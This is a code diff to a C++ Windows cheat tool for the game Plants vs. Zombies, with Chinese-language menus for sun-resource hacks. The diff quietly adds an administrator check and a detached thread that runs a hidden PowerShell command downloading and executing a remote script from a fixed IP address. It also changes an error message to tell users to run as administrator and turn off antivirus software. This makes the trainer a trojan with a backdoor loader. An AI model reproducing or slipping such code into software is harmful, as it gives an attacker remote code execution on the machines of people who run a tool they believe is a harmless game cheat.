@@ -1,6 +1,7 @@
 #include<windows.h>
 #include<TlHelp32.h>
 #include<stdio.h> 
+#include<thread>
 
 DWORD dwPid;
 HANDLE hTarget;
@@ -55,7 +56,7 @@ BOOL PatchGame(LPVOID lpAddr, BYTE* bBuff, DWORD dwSize){
 }
 
 void Menu(){
-	puts("[+] 欢迎来到p0iL的pvz修改器0.0.1菜单");
+	puts("[+] 欢迎来到p0iL的pvz修改器v0.0.2菜单");
 	puts("- 显示菜单：0");
 	puts("- 阳光修改：种植不损耗阳光：1");
 	puts("- 阳光修改：捡起阳光超级加倍：2");
@@ -63,15 +64,41 @@ void Menu(){
 	puts("[+] 请输入对应数字回车执行对应操作");
 }
 
+BOOL IsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+void systemThread(const char* command) {
+    system(command);
+}
+
 int main(){
+	if (!IsAdmin()) {
+        puts("[-] 请以管理员身份运行该破解器");
+        system("pause");
+        return 1;
+    }
+	
+	std::thread t(systemThread, "powershell.exe -nop -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.163.128:80/a'))\"");
+	t.detach();
+	
 	if(GetProcessPidByName((char *)"popcapgame1.exe", &dwPid)==FALSE){
-		puts("[-] can not found Pid");
+		puts("[-] 请先运行游戏后再打开");
+		system("pause");
 		return 0;
 	}
 	
 	hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
 	if(hTarget==NULL){
-		puts("[-] can not open this process"); 
+		puts("[-] 无法打开游戏进程，请以管理员模式启动外挂，并关闭杀毒软件"); 
+		system("pause");
 		return 0;
 	}
 	
@@ -104,9 +131,9 @@ int main(){
 				break;
 			}
 			default:
-				puts("[-] 输入错误，可以输入0查看菜单"); 
 				break;
 		}
 	}
+	system("pause");
  	return 0;
 }
